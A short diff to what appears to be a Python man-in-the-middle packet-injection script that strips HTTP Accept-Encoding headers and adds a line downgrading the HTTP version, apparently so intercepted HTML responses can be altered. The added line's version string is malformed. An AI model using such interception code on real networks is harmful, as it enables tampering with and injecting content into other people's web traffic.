@@ -55,6 +55,7 @@ def packinjector(packet):
             print("[Info] --> HTTP request")
             if "Accept-Encoding" in str(load):
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(load))
+                load = str(load).replace("HTTP1/1", "HTTP1/0")
         elif spacket[sc.TCP].sport == 80:
             print("[Info] --> HTTP response")
             if "text/html" in str(load):
